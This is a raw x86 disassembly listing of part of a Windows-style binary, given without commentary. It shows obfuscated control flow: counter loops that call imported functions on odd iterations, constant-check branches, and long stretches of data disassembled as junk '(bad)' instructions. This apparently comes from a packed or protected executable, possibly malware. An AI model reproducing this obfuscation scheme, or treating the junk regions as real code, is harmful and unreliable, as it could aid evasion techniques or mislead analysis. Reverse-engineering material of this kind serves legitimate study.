  4018dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4018df:	add    esi,DWORD PTR ds:0x42ec57
  4018e5:	mov    DWORD PTR [ecx],eax
  4018e7:	and    DWORD PTR ds:0x42ec5b,0x0
  4018f1:	mov    esi,DWORD PTR ds:0x42ec5b
  4018f7:	inc    esi
  4018f8:	mov    DWORD PTR ds:0x42ec5b,esi
  4018fe:	cmp    DWORD PTR ds:0x42ec5b,0xb
  401905:	jne    0x401914
  40190b:	push   DWORD PTR [ebp-0x1c]
  40190e:	call   DWORD PTR ds:0x42ea8f
  401914:	cmp    DWORD PTR ds:0x42ec5b,0xa
  40191b:	jne    0x40192e
  401921:	mov    esi,DWORD PTR ds:0x42ec5b
  401927:	inc    esi
  401928:	mov    DWORD PTR ds:0x42ec5b,esi
  40192e:	cmp    DWORD PTR ds:0x42ec5b,0x17
  401935:	jb     0x4018f1
  40193b:	sbb    DWORD PTR ds:0x42ec4b,0x20dd
  401945:	mov    ecx,0x7510854
  40194a:	and    DWORD PTR ds:0x43035b,0x0
  401954:	jmp    0x401966
  401959:	mov    esi,DWORD PTR ds:0x43035b
  40195f:	inc    esi
  401960:	mov    DWORD PTR ds:0x43035b,esi
  401966:	cmp    DWORD PTR ds:0x43035b,0x12
  40196d:	jae    0x4019a5
  401973:	cmp    DWORD PTR ds:0x43035b,0x22
  40197a:	jne    0x40199a
  401980:	push   0x7ffb
  401985:	push   0x8364
  40198a:	push   0x42e737
  40198f:	push   0x6aad
  401994:	call   DWORD PTR ds:0x42e917
  40199a:	jmp    0x401959
  40199f:	sbb    esi,DWORD PTR ds:0x4302bd
  4019a5:	mov    esi,0x32729b
  4019aa:	push   ebx
  4019ab:	and    DWORD PTR ds:0x4302b5,0x0
  4019b5:	xor    ebx,ebx
  4019b7:	or     ebx,DWORD PTR ds:0x4302b5
  4019bd:	inc    ebx
  4019be:	mov    DWORD PTR ds:0x4302b5,ebx
  4019c4:	cmp    DWORD PTR ds:0x4302b5,0x19
  4019cb:	jne    0x4019e5
  4019d1:	push   0x42e7c5
  4019d6:	push   DWORD PTR [ebp-0x20]
  4019d9:	push   DWORD PTR [ebp-0x10]
  4019dc:	push   DWORD PTR [ebp-0xc]
  4019df:	call   DWORD PTR ds:0x42e83b
  4019e5:	cmp    DWORD PTR ds:0x4302b5,0x16
  4019ec:	jb     0x4019b5
  4019f2:	mov    ax,WORD PTR [ebp-0x24]
  4019f6:	movzx  eax,ax
  4019f9:	mov    DWORD PTR [ebp-0x38],eax
  4019fc:	mov    eax,DWORD PTR [ebp+0x8]
  4019ff:	mov    DWORD PTR [ebp-0x28],eax
  401a02:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  401a09:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  401a10:	mov    eax,0x9577
  401a15:	mov    WORD PTR [ebp-0x4],ax
  401a19:	lea    eax,[ebp-0x30]
  401a1c:	mov    DWORD PTR [ebp-0x34],eax
  401a1f:	mov    eax,DWORD PTR [ebp-0x28]
  401a22:	mov    DWORD PTR [ebp-0x2c],eax
  401a25:	lea    eax,[ebp-0x18]
  401a28:	mov    DWORD PTR [ebp-0x1c],eax
  401a2b:	mov    eax,DWORD PTR [ebp-0x1c]
  401a2e:	mov    DWORD PTR [eax],0xf89f2da9
  401a34:	mov    eax,DWORD PTR [ebp-0x14]
  401a37:	mov    ebx,DWORD PTR [ebp-0x8]
  401a3a:	xor    eax,ecx
  401a3c:	xor    ebx,ecx
  401a3e:	xor    edx,edx
  401a40:	add    eax,esi
  401a42:	add    ebx,esi
  401a44:	div    ebx
  401a46:	mov    edx,DWORD PTR [ebp-0x2c]
  401a49:	cmp    eax,DWORD PTR [edx]
  401a4b:	je     0x402095
  401a51:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401a58:	jmp    0x401c1b
  401a5d:	mov    DWORD PTR [ebp-0x5a],0xc159a499
  401a64:	popa   
  401a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a66:	ja     0x401a61
  401a68:	and    eax,0x2a22dd3
  401a6d:	xchg   esi,eax
  401a6e:	js     0x401aee
  401a70:	jle    0x401a0a
  401a72:	jg     0x401af2
  401a74:	jle    0x401a6b
  401a76:	xchg   ebx,eax
  401a77:	mov    ds:0x73574315,al
  401a7c:	jp     0x401a37
  401a7e:	push   edi
  401a7f:	mov    ah,0x78
  401a81:	je     0x401a41
  401a83:	and    ebx,eax
  401a85:	mov    bl,0x75
  401a87:	add    al,0xe4
  401a89:	outs   dx,BYTE PTR ds:[esi]
  401a8a:	lds    edi,FWORD PTR [eax]
  401a8c:	pop    esi
  401a8d:	pop    ss
  401a8e:	sbb    DWORD PTR [eax-0x5c],0x21
  401a92:	les    ebx,FWORD PTR [ebx-0x57]
  401a95:	adc    DWORD PTR [eax],esp
  401a97:	add    BYTE PTR [ecx+0x70],bh
  401a9a:	es loopne 0x401b14
  401a9d:	outs   dx,BYTE PTR ds:[esi]
  401a9e:	arpl   bp,si
  401aa0:	jecxz  0x401a86
  401aa2:	and    al,0x39
  401aa4:	mov    ebp,0xb87bd23a
  401aa9:	pop    edi
  401aaa:	mov    DWORD PTR [edi+0x5f56b4de],ecx
  401ab0:	dec    ecx
  401ab1:	lock pop esp
  401ab3:	inc    edi
  401ab4:	std    
  401ab5:	test   bh,bh
  401ab7:	jne    0x401a42
  401ab9:	mov    dl,BYTE PTR [edx]
  401abb:	xor    eax,0x668e3668
  401ac0:	xor    DWORD PTR [edi+ebx*8-0x5ccc9482],0x6d2149af
  401acb:	xor    al,BYTE PTR [ebx+0x59]
  401ace:	dec    ecx
  401acf:	imul   esp,DWORD PTR [eax-0x1c8c5f3a],0x45fab6a8
  401ad9:	or     esi,ebx
  401adb:	aas    
  401adc:	xor    eax,0x2ba2d827
  401ae1:	mov    ds:0xb2313c23,al
  401ae6:	test   eax,0x47bf3b92
  401aeb:	jnp    0x401b0c
  401aed:	xchg   ebx,eax
  401aee:	dec    esi
  401aef:	(bad)  
  401af0:	retf   0x94ef
  401af3:	xor    al,0xaf
  401af5:	(bad)  
  401af6:	cmp    DWORD PTR [ebp+0x6a],ecx
  401af9:	add    eax,0x3f56f361
  401afe:	retf   
  401aff:	(bad)  
  401b00:	out    dx,al
  401b01:	aam    0xec
  401b03:	pop    ebp
  401b04:	dec    eax
  401b05:	ror    dl,cl
  401b07:	add    esp,DWORD PTR [edx]
  401b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b0a:	mov    bh,0xfd
  401b0c:	outs   dx,DWORD PTR ds:[esi]
  401b0d:	mov    al,0x1b
  401b0f:	push   esp
  401b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b11:	fcomp  DWORD PTR [ecx+0x5a]
  401b14:	shr    DWORD PTR [ecx-0x57332e7],1
  401b1a:	daa    
  401b1b:	loop   0x401b87
  401b1d:	scas   al,BYTE PTR es:[edi]
  401b1e:	lds    edi,FWORD PTR [eax]
  401b20:	dec    eax
  401b21:	and    ebx,DWORD PTR [ecx+0x720116bc]
  401b27:	out    0xc1,al
  401b29:	mov    dl,0x7
  401b2b:	and    ebp,esp
  401b2d:	in     al,0x1b
  401b2f:	das    
  401b30:	adc    eax,0x6b42b9c4
  401b35:	fucom  st(1)
  401b37:	nop
  401b38:	cmp    al,0x2e
  401b3a:	popa   
  401b3b:	fst    QWORD PTR [ecx+eax*1+0x571867da]
  401b42:	xor    al,0xe2
  401b44:	(bad)  
  401b45:	fxch   st(3)
  401b47:	(bad)  
  401b48:	in     eax,0xe2
  401b4a:	shl    ebx,cl
  401b4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b4d:	inc    ecx
  401b4e:	pop    esi
  401b4f:	rcr    DWORD PTR [edx+0x4477253e],1
  401b55:	cdq    
  401b56:	ror    DWORD PTR [ecx],1
  401b58:	adc    al,al
  401b5a:	mov    esp,0x21347e81
  401b5f:	fdivr  QWORD PTR ds:0x2922be8f
  401b65:	cdq    
  401b66:	and    eax,edx
  401b68:	sub    BYTE PTR [ecx],bl
  401b6a:	jmp    0x78a536d4
  401b6f:	pop    ebp
  401b70:	loope  0x401be6
  401b72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b73:	jmp    0x3838:0x76e28b90
  401b7a:	(bad)  
  401b7c:	shl    DWORD PTR [edx],cl
  401b7e:	shl    DWORD PTR [edi-0x724b4971],1
  401b84:	inc    edx
  401b85:	scas   eax,DWORD PTR es:[edi]
  401b86:	mov    esi,0xc43dea98
  401b8b:	les    ebp,FWORD PTR gs:[ebx-0x35]
  401b8f:	mov    al,0xe0
  401b91:	aas    
  401b92:	xchg   BYTE PTR [eax],bh
  401b94:	aad    0x1d
  401b96:	inc    edi
  401b97:	push   ss
  401b98:	repz int3 
  401b9a:	addr16 leave 
  401b9c:	push   esi
  401b9d:	mov    edx,0x299b2087
  401ba2:	mov    edx,0x2bc1824e
  401ba7:	jg     0x401be2
  401ba9:	(bad)  
  401baa:	jmp    0xe122:0xb3558582
  401bb1:	dec    esi
  401bb2:	mov    al,BYTE PTR [edi-0xdcff3cc]
  401bb8:	gs dec ecx
  401bba:	retf   0xede0
  401bbd:	hlt    
  401bbe:	or     ebx,DWORD PTR [esi]
  401bc0:	xor    al,0x63
  401bc2:	addr16 fs dec edi
  401bc5:	outs   dx,BYTE PTR fs:[esi]
  401bc7:	ror    DWORD PTR [esi-0x6e],0x6d
  401bcb:	call   0x63b11e15
  401bd0:	outs   dx,BYTE PTR ds:[esi]
  401bd1:	js     0x401bc2
  401bd3:	fcmovb st,st(4)
  401bd5:	jbe    0x401c3d
  401bd7:	stc    
  401bd8:	je     0x401bca
  401bda:	mov    esp,0xfa911c0
  401bdf:	sbb    al,0x14
  401be1:	ror    BYTE PTR [ebp+edi*8-0x23314782],1
  401be8:	adc    cl,al
  401bea:	or     cl,dl
  401bec:	(bad)
  401bef:	pop    esi
  401bf0:	data16 imul ch
  401bf3:	arpl   WORD PTR ss:[eax],sp
  401bf6:	and    al,0x29
  401bf8:	dec    ecx
  401bf9:	xor    dl,bl
  401bfb:	scas   al,BYTE PTR es:[edi]
  401bfc:	ror    BYTE PTR [edx],cl
  401bfe:	pop    ecx
  401bff:	in     eax,0xd9
  401c01:	rcr    dh,1
  401c03:	(bad)  
  401c04:	out    dx,al
  401c05:	sub    edi,DWORD PTR [eax+0x5d]
  401c08:	dec    ebx
  401c09:	cwde   
  401c0a:	push   edx
  401c0b:	jmp    0x401c13
  401c0d:	inc    ebx
  401c0e:	add    ecx,DWORD PTR [bp-0x34]
  401c12:	lds    edx,FWORD PTR [bx-0x17c5]
  401c17:	mov    ch,0xd3
  401c19:	or     ch,al
  401c1b:	lea    eax,[ebp-0xc]
  401c1e:	mov    DWORD PTR [ebp-0x10],eax
  401c21:	mov    eax,DWORD PTR [ebp-0x10]
  401c24:	mov    edx,DWORD PTR [eax]
  401c26:	imul   edx,edx,0xf89ea9ee
  401c2c:	mov    DWORD PTR [eax],edx
  401c2e:	mov    eax,DWORD PTR [ebp-0xc]
  401c31:	cmp    eax,0x823721f2
  401c36:	je     0x401c4a
  401c3c:	mov    eax,DWORD PTR [ebp-0x1c]
  401c3f:	or     DWORD PTR [eax],0x60751c9e
  401c45:	jmp    0x4020a4
  401c4a:	mov    eax,DWORD PTR [ebp-0xc]
  401c4d:	add    eax,DWORD PTR [ebp-0x18]
  401c50:	cmp    eax,0x7ad64f9b
  401c55:	je     0x401c69
  401c5b:	mov    eax,DWORD PTR [ebp-0x10]
  401c5e:	and    DWORD PTR [eax],0x751c99
  401c64:	jmp    0x4020a4
  401c69:	mov    eax,DWORD PTR [ebp-0xc]
  401c6c:	mov    edx,DWORD PTR [ebp-0x18]
  401c6f:	or     eax,edx
  401c71:	cmp    eax,0xfabf2dfb
  401c76:	je     0x401e4d
  401c7c:	mov    eax,DWORD PTR [ebp-0x10]
  401c7f:	jmp    0x401e42
  401c84:	das    
  401c85:	adc    bh,cl
  401c87:	inc    edx
  401c88:	icebp  
  401c89:	inc    ecx
  401c8a:	mov    bl,0x71
  401c8c:	test   DWORD PTR [edx],ebx
  401c8e:	and    bl,BYTE PTR [esi]
  401c90:	mov    ebx,0x305cd684
  401c95:	push   es
  401c96:	jle    0x401d16
  401c98:	cwde   
  401c99:	jg     0x401d19
  401c9b:	jle    0x401cc1
  401c9d:	loopne 0x401cee
  401c9f:	outs   dx,DWORD PTR es:[esi]
  401ca1:	sub    eax,0x11937352
  401ca6:	sub    BYTE PTR [esi+0x2a],0xb1
  401caa:	arpl   WORD PTR [esi],si
  401cac:	xor    eax,0x3ce72d7f
  401cb1:	jbe    0x401c5a
  401cb3:	adc    BYTE PTR [edx+0x7e57fbad],cl
  401cb9:	add    al,0x6d
  401cbb:	jecxz  0x401d3b
  401cbd:	add    al,0x97
  401cbf:	jo     0x401c76
  401cc1:	or     DWORD PTR [eax-0x3579bd5a],ecx
  401cc7:	dec    edx
  401cc8:	mov    DWORD PTR [ebp+0x15],edx
  401ccb:	mov    eax,ds:0x662fddaf
  401cd0:	mov    ebp,DWORD PTR [edx]
  401cd2:	mov    ch,0x3d
  401cd4:	push   0xffffff81
  401cd6:	pop    ecx
  401cd7:	sbb    al,0x30
  401cd9:	xor    DWORD PTR [eax-0x2d],ecx
  401cdc:	dec    edx
  401cdd:	in     eax,0xf7
  401cdf:	(bad)  
  401ce0:	sbb    al,0x99
  401ce2:	ror    cl,1
  401ce4:	je     0x401d06
  401ce6:	not    BYTE PTR [ecx-0x55a5f7a1]
  401cec:	aaa    
  401ced:	mov    eax,0x34696b85
  401cf2:	sbb    BYTE PTR [ebx-0x2b68e1c3],al
  401cf8:	retf   
  401cf9:	and    al,0x5
  401cfb:	and    esi,edi
  401cfd:	push   0xfffffff8
  401cff:	repnz fcomp DWORD PTR [edx+0x39faaf63]
  401d06:	in     eax,0x9c
  401d08:	in     eax,dx
  401d09:	outs   dx,BYTE PTR ds:[esi]
  401d0a:	dec    ebx
  401d0b:	and    DWORD PTR gs:[esi-0x18f182aa],esp
  401d12:	xor    esi,DWORD PTR [ecx+ecx*8-0x16a3654b]
  401d19:	(bad)  
  401d1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d1b:	out    dx,al
  401d1c:	jmp    0x401cda
  401d1e:	ins    DWORD PTR es:[edi],dx
  401d1f:	repz rcl ecx,0x6a
  401d23:	es cmp ebx,ebx
  401d26:	sbb    DWORD PTR [edi+eiz*1-0x1b],0x21d93655
  401d2e:	(bad)  
  401d2f:	rcr    DWORD PTR [edx],cl
  401d31:	psubsw mm0,QWORD PTR [edi+eiz*4+0x1]
  401d36:	fucomip st,st(5)
  401d38:	fist   DWORD PTR [ecx]
  401d3a:	inc    ebx
  401d3b:	mov    edx,0x8f5b08d6
  401d40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d41:	inc    eax
  401d42:	xadd   eax,ebx
  401d45:	add    al,0x63
  401d47:	sbb    eax,0xde9570d8
  401d4c:	arpl   WORD PTR [edx+0x29aa8d25],ax
  401d52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d53:	ds or  esp,ebp
  401d56:	mov    esp,0xcabcb761
  401d5b:	stos   BYTE PTR es:[edi],al
  401d5c:	xor    BYTE PTR [ebp+0x7a],ch
  401d5f:	dec    ebp
  401d60:	pop    es
  401d61:	ja     0x401d85
  401d63:	aad    0xb9
  401d65:	cmp    dh,BYTE PTR [edx+0x1985a42d]
  401d6b:	add    ebp,DWORD PTR [ebp+0x43d7ac8c]
  401d71:	fist   DWORD PTR [esi]
  401d73:	shl    BYTE PTR [edx+0x8028863],cl
  401d79:	jns    0x401cfd
  401d7b:	mov    ds,esi
  401d7d:	scas   eax,DWORD PTR es:[edi]
  401d7e:	pop    ebp
  401d7f:	(bad)  [edi+0x6ee4c267]
  401d85:	pusha  
  401d86:	mov    eax,ds:0x919b22a9
  401d8b:	je     0x401d58
  401d8d:	mov    dl,0xda
  401d8f:	push   ebp
  401d90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d91:	mov    ah,0xc9
  401d93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d94:	cmp    DWORD PTR [edi+0x521afca8],esi
  401d9a:	popa   
  401d9b:	aam    0x1a
  401d9d:	pop    eax
  401d9e:	cmp    DWORD PTR [ecx],eax
  401da0:	repz push 0x44
  401da3:	xor    ebp,DWORD PTR [ebp-0x40]
  401da6:	pop    eax
  401da7:	loopne 0x401de4
  401da9:	rcl    BYTE PTR ds:0x21e98b6c,0xd7
  401db0:	mov    al,0xde
  401db2:	scas   al,BYTE PTR es:[edi]
  401db3:	and    ah,BYTE PTR [edx-0x34]
  401db6:	push   0x3344b34
  401dbb:	cli    
  401dbc:	xchg   BYTE PTR [esi-0x74],ch
  401dbf:	mov    ds:0xca35b8d8,eax
  401dc4:	out    0x58,eax
  401dc6:	dec    eax
  401dc7:	outs   dx,DWORD PTR ds:[esi]
  401dc8:	loop   0x401dc3
  401dca:	xchg   esi,eax
  401dcb:	hlt    
  401dcc:	cmc    
  401dcd:	pusha  
  401dce:	fiadd  WORD PTR [edx]
  401dd0:	cwde   
  401dd1:	bound  ecx,QWORD PTR [ebp-0x235bddee]
  401dd7:	in     eax,dx
  401dd8:	pop    ecx
  401dd9:	and    ecx,DWORD PTR [ecx+0x1b]
  401ddc:	mov    al,ds:0x1c67357e
  401de1:	xchg   edx,eax
  401de2:	(bad)  
  401de3:	mov    ebx,0x19a2fcb8
  401de8:	stos   BYTE PTR es:[edi],al
  401de9:	dec    esi
  401dea:	mov    dl,BYTE PTR [edx-0x414267c5]
  401df0:	mov    esp,0x3c9f49f5
  401df5:	adc    DWORD PTR [edi-0x2f],0x3d
  401df9:	xchg   esi,eax
  401dfa:	sti    
  401dfb:	dec    edx
  401dfd:	jg     0x401d8c
  401dff:	clc    
  401e00:	int    0xb
  401e02:	popa   
  401e03:	mov    esp,0x9a724952
  401e08:	push   esi
  401e09:	xchg   esp,eax
  401e0a:	mov    bl,BYTE PTR [ecx-0x2d85f892]
  401e10:	adc    eax,0x92a67082
  401e15:	rol    BYTE PTR [eax+ecx*4-0x3a],1
  401e19:	xchg   esi,eax
  401e1a:	mov    ecx,0x885f0f00
  401e1f:	add    BYTE PTR [esi],ah
  401e21:	mov    ah,0xfc
  401e23:	xchg   ecx,eax
  401e24:	add    dl,BYTE PTR [ebp+0x663d453a]
  401e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e2b:	push   ebx
  401e2c:	pop    edx
  401e2d:	dec    esp
  401e2e:	dec    eax
  401e2f:	je     0x401e1e
  401e31:	(bad)  
  401e32:	aas    
  401e33:	sbb    al,bh
  401e35:	mov    ah,0xb2
  401e37:	rcl    DWORD PTR [esi+0x57488bc7],0x48
  401e3e:	int3   
  401e3f:	fs daa 
  401e41:	test   DWORD PTR [ecx+0x50fa8f30],0x257e926
  401e4b:	add    BYTE PTR [eax],al
  401e4d:	mov    ax,WORD PTR [ebp-0x4]
  401e51:	mov    edx,0x8a3c
  401e56:	xor    ax,dx
  401e59:	mov    edx,DWORD PTR [ebp-0x28]
  401e5c:	mov    edx,DWORD PTR [edx]
  401e5e:	add    ax,di
  401e61:	cmp    ax,WORD PTR [edx]
  401e64:	je     0x402074
  401e6a:	mov    eax,DWORD PTR [ebp-0x14]
  401e6d:	xor    eax,ecx
  401e6f:	jmp    0x402032
  401e74:	mov    ebp,0xd91a1ffb
  401e79:	call   0xdfe:0x67459b9
  401e80:	pop    ss
  401e81:	imul   edx,DWORD PTR [edi],0x7e075a4b
  401e87:	jle    0x401e21
  401e89:	jg     0x401f09
  401e8b:	jle    0x401e48
  401e8d:	cwde   
  401e8e:	jl     0x401e95
  401e90:	addr16 adc al,0x6a
  401e93:	dec    esp
  401e94:	ret    
  401e95:	mov    esp,DWORD PTR [edx]
  401e97:	push   ds
  401e98:	mov    edx,DWORD PTR [edi-0x75]
  401e9b:	aad    0x8f
  401e9d:	sbb    bh,BYTE PTR [eax]
  401e9f:	mov    dh,0x99
  401ea1:	mov    ch,0xbc
  401ea3:	push   0x47
  401ea5:	ror    DWORD PTR [esi],0x1b
  401ea8:	add    eax,0x8536fafc
  401ead:	push   cs
  401eae:	or     ecx,esp
  401eb0:	pop    edx
  401eb1:	xor    esi,DWORD PTR [ecx]
  401eb3:	lock dec ecx
  401eb5:	fs cwde 
  401eb7:	mov    dh,0xa
  401eb9:	push   esi
  401eba:	into   
  401ebb:	dec    edx
  401ebc:	mov    dl,0xdd
  401ebe:	pop    es
  401ebf:	int    0x28
  401ec1:	adc    ecx,esp
  401ec3:	fsubr  QWORD PTR [ebx]
  401ec5:	lods   eax,DWORD PTR ds:[esi]
  401ec6:	push   edi
  401ec7:	cmp    al,0x81
  401ec9:	cmp    al,0x9
  401ecb:	lods   eax,DWORD PTR ds:[esi]
  401ecc:	(bad)  
  401ecd:	pop    ds
  401ece:	and    al,0xd7
  401ed0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ed1:	sbb    al,0xf2
  401ed3:	scas   al,BYTE PTR es:[edi]
  401ed4:	scas   al,BYTE PTR es:[edi]
  401ed5:	jl     0x401eb4
  401ed7:	xchg   ebp,eax
  401ed8:	loop   0x401ea8
  401eda:	pop    ecx
  401edb:	stos   BYTE PTR es:[edi],al
  401edc:	or     edi,esp
  401ede:	pop    es
  401edf:	push   ecx
  401ee0:	fs inc edi
  401ee2:	pop    esi
  401ee3:	popa   
  401ee4:	gs dec edi
  401ee6:	push   edi
  401ee7:	add    DWORD PTR [edx],eax
  401ee9:	inc    ebp
  401eea:	div    BYTE PTR [edi-0x4bc26760]
  401ef0:	mov    DWORD PTR [ebx-0x6d],ebx
  401ef3:	leave  
  401ef4:	cmp    al,0xcb
  401ef6:	scas   al,BYTE PTR es:[edi]
  401ef7:	push   0xfffffffb
  401ef9:	in     eax,0xb5
  401efb:	lods   al,BYTE PTR ds:[esi]
  401efc:	in     eax,dx
  401efd:	mov    dl,0xfe
  401eff:	xchg   ebp,eax
  401f00:	mov    ecx,0x4d6c3fd3
  401f05:	cmp    eax,0x3567c8e4
  401f0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f0b:	mov    dl,0x29
  401f0d:	lock pop ds
  401f0f:	pop    esi
  401f10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f11:	(bad)  
  401f12:	and    BYTE PTR [ebx-0x1164fce4],ah
  401f18:	jle    0x401f4e
  401f1a:	mov    bh,0x37
  401f1c:	jne    0x401f7e
  401f1e:	ss cwde 
  401f20:	push   ss
  401f21:	adc    ecx,DWORD PTR [edx+eax*8+0x406e5a1c]
  401f28:	popa   
  401f29:	aam    0x64
  401f2b:	mov    WORD PTR [eax+0x115f437],?
  401f31:	inc    ebp
  401f32:	(bad)  
  401f33:	and    al,BYTE PTR [ebp+0x637b8c0f]
  401f39:	push   0xffffffce
  401f3b:	jecxz  0x401f00
  401f3d:	cmp    edi,DWORD PTR [eax+0x5b]
  401f40:	mov    ch,0x9
  401f42:	cmc    
  401f43:	sbb    ebx,DWORD PTR [eax+ecx*1-0x351acc4e]
  401f4a:	pop    esi
  401f4b:	fcmovu st,st(7)
  401f4d:	fisubr WORD PTR [ecx+0x5f]
  401f50:	push   0xffffffd5
  401f52:	cmp    DWORD PTR [edi],esi
  401f54:	aam    0x62
  401f56:	pop    eax
  401f57:	cli    
  401f58:	jo     0x401f23
  401f5a:	lea    edx,[eax+0x11]
  401f5d:	loop   0x401f75
  401f5f:	mov    ecx,0x8951e04b
  401f64:	xor    al,0xfd
  401f66:	xor    al,BYTE PTR [esp+ecx*4+0x6c3909cc]
  401f6d:	loopne 0x401fe7
  401f6f:	cmc    
  401f70:	inc    ebx
  401f71:	mov    bh,0xcb
  401f73:	ret    
  401f74:	push   edx
  401f75:	cld    
  401f76:	mov    ah,0xf9
  401f78:	(bad)  
  401f79:	xor    ecx,DWORD PTR [edi]
  401f7b:	stc    
  401f7c:	jg     0x401f6c
  401f7e:	mov    bh,0xdc
  401f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f81:	pop    ss
  401f82:	shr    BYTE PTR [eax+0x31d7a71c],1
  401f88:	ins    DWORD PTR es:[edi],dx
  401f89:	cwde   
  401f8a:	lahf   
  401f8b:	sbb    BYTE PTR [eax],al
  401f8d:	jmp    0xe6a3:0x1a1ba1e5
  401f94:	fidiv  WORD PTR [ecx+0x43]
  401f97:	xor    DWORD PTR [esi+esi*8+0x6f7b2314],0x1d
  401f9f:	addps  xmm2,XMMWORD PTR [ebx]
  401fa2:	pop    eax
  401fa3:	jns    0x401f44
  401fa5:	in     al,dx
  401fa6:	jg     0x401fc0
  401fa8:	fnstenv [ecx+0x16]
  401fab:	or     BYTE PTR [ebp+0x1e],ch
  401fae:	loopne 0x401f69
  401fb0:	sbb    ah,BYTE PTR [ebx+0x41]
  401fb3:	(bad)  
  401fb4:	iret   
  401fb5:	mov    eax,0xfb0542cc
  401fba:	mov    dl,0x17
  401fbc:	lods   eax,DWORD PTR ds:[esi]
  401fbd:	mov    ebp,0xe73be7e8
  401fc2:	mov    WORD PTR [ecx-0x6def3c3],?
  401fc8:	push   es
  401fc9:	inc    ebx
  401fca:	test   eax,0xd1a3a780
  401fcf:	je     0x40202e
  401fd1:	es jo  0x40200f
  401fd4:	sub    bl,ah
  401fd6:	jnp    0x401ffd
  401fd8:	add    dh,BYTE PTR [eax-0x66586da3]
  401fde:	cmp    al,0x79
  401fe0:	inc    ecx
  401fe1:	retf   0x8bc
  401fe4:	shl    DWORD PTR [esi+esi*8+0x30],0xb
  401fe9:	arpl   di,di
  401feb:	pop    ds
  401fec:	inc    edx
  401fed:	add    bh,BYTE PTR [esi+0x66]
  401ff0:	pop    esp
  401ff1:	sahf   
  401ff2:	cmp    bh,BYTE PTR [esi-0x6b12a41a]
  401ff8:	xor    ebx,DWORD PTR [eax+0x147d264a]
  401ffe:	in     al,0xd9
  402000:	mov    ah,0x2c
  402002:	in     eax,0x2
  402004:	sar    dl,1
  402006:	xor    dl,bl
  402008:	xchg   DWORD PTR [edx+0x50945bb4],esi
  40200e:	ins    BYTE PTR es:[edi],dx
  40200f:	push   ecx
  402010:	jp     0x40205e
  402012:	fwait
  402013:	dec    edx
  402014:	mov    edx,0x700b590d
  402019:	pop    edx
  40201a:	inc    edi
  40201b:	dec    ecx
  40201c:	adc    al,0x60
  40201e:	jge    0x402017
  402020:	rol    BYTE PTR [edx+ecx*1+0x6083e4c9],0xcf
  402028:	(bad)  
  402029:	repnz cmc 
  40202b:	adc    ebp,edi
  40202d:	ja     0x40207e
  40202f:	repnz mov ecx,0x89c6030f
  402035:	inc    ebp
  402036:	ror    BYTE PTR [ebx-0x749933bb],1
  40203c:	push   ebp
  40203d:	enter  0x3cbb,0x8a
  402041:	add    BYTE PTR [eax],al
  402043:	xor    dx,bx
  402046:	mov    ebx,DWORD PTR [ebp-0x8]
  402049:	add    dx,di
  40204c:	movzx  edx,dx
  40204f:	xor    ebx,ecx
  402051:	lea    edx,[edx+ebx*1+0x32729b]
  402058:	add    DWORD PTR [eax],edx
  40205a:	mov    eax,DWORD PTR [ebp-0x2c]
  40205d:	mov    edx,DWORD PTR [ebp-0x8]
  402060:	mov    ebx,DWORD PTR [ebp-0x30]
  402063:	xor    edx,ecx
  402065:	add    edx,esi
  402067:	imul   edx,ebx
  40206a:	sub    DWORD PTR [eax],edx
  40206c:	mov    eax,DWORD PTR [ebp-0x14]
  40206f:	jmp    0x4020a7
  402074:	mov    eax,DWORD PTR [ebp-0xc]
  402077:	mov    edx,DWORD PTR [ebp-0x18]
  40207a:	xor    eax,edx
  40207c:	cmp    eax,0x7aa80c5b
  402081:	je     0x4020a4
  402087:	mov    eax,DWORD PTR [ebp-0x10]
  40208a:	add    DWORD PTR [eax],0x7403501
  402090:	jmp    0x4020a4
  402095:	mov    eax,DWORD PTR [ebp-0x1c]
  402098:	cmp    DWORD PTR [eax],0xf89f2da9
  40209e:	jne    0x4020bf
  4020a4:	mov    eax,DWORD PTR [ebp-0x8]
  4020a7:	xor    eax,ecx
  4020a9:	add    eax,esi
  4020ab:	test   eax,eax
  4020ad:	jne    0x4020bf
  4020b3:	xor    DWORD PTR [ebp-0x20],0xe149eb8
  4020ba:	jmp    0x4019ab
  4020bf:	pop    ebx
  4020c0:	pop    edi
  4020c1:	pop    esi
  4020c2:	leave  
  4020c3:	ret    0x4
  4020c6:	push   ebp
  4020c7:	mov    ebp,esp
  4020c9:	sub    esp,0x28
  4020cc:	leave  
  4020cd:	ret    0x10
  4020d0:	push   ebp
  4020d1:	mov    ebp,esp
  4020d3:	jmp    0x4022cb
  4020d8:	outs   dx,BYTE PTR ds:[esi]
  4020d9:	jecxz  0x402113
  4020db:	mov    ecx,0xf16f6151
  4020e0:	jne    0x402154
  4020e2:	add    al,0xd
  4020e4:	jns    0x4020bb
  4020e6:	std    
  4020e7:	add    BYTE PTR [ebp+eax*1+0x7f557e7e],0x7e
  4020ef:	jle    0x40209c
  4020f1:	or     al,0x9c
  4020f3:	out    dx,eax
  4020f4:	sar    BYTE PTR [ecx+0x65aa6ddb],cl
  4020fa:	jae    0x40217a
  4020fc:	or     bl,bl
  4020fe:	fild   QWORD PTR [esi]
  402100:	inc    edi
  402101:	mov    DWORD PTR [eax-0x642874eb],eax
  402107:	adc    WORD PTR [edx],0xffc9
  40210b:	les    edi,FWORD PTR [edx]
  40210d:	imul   ebp,DWORD PTR [ebp+0x4a651c85],0x135e52ab
  402117:	fwait
  402118:	adc    eax,0xd4a76e78
  40211d:	es xchg edi,eax
  40211f:	aas    
